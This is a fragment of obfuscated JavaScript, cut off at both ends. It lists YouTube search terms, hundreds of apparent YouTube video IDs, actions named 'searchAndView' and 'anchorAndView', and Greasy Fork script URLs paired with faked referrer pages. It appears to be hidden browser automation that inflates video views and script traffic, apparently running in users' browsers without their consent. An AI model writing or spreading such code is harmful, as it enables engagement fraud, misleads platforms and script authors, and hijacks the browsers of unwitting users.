searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + X(0x2, 'k[Ij') + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x191e + -0x25c3 + 0xbf * 0x11)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x4a0 + -0x1621 + 0x1acb)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + Y(0x9) + '\x20army,v\x20bt' + X(0x6, '()62') + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms[Z(0x13)](0xad * -0x29 + -0x1d3 + 0x1d8b);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    Y(0x1c) + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    Y(0x8) + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    Y(0x11) + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    X(0x12, 'Jw]E') + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + Y(0x17) + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': X(0x1b, '^4Ar') + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + Y(0x17) + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + X(0xb, 'K*B7') + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': Y(0x16) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Z(0x19) + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
